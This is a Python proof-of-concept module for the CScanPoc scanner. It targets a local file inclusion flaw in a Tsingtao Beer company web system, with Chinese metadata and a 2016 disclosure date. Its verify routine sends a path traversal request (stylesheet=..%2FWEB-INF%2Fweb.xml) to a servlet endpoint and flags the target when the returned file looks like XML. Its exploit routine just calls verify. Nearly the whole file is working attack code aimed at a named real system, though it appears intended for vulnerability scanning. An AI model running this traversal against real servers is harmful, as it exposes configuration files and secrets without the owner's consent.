# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Tsingtao_0000' # 平台漏洞编号
    name = '青岛啤酒系统存在任意文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2016-01-11'  # 漏洞公布时间
    desc = '''
        青岛啤酒系统存在任意文件包含漏洞，可以读取任意敏感信息。
    ''' # 漏洞描述
    ref = 'Unknown' #https://wooyun.shuimugan.com/bug/view?bug_no=153324
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '青岛啤酒'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e2e63970-2b57-4829-beed-e930290082db' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/servlet/qdbAction?cmd=start&stylesheet=..%2FWEB-INF%2Fweb.xml'
            response = requests.get(vul_url)
            if response.status_code ==200 and 'xml version' in response.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
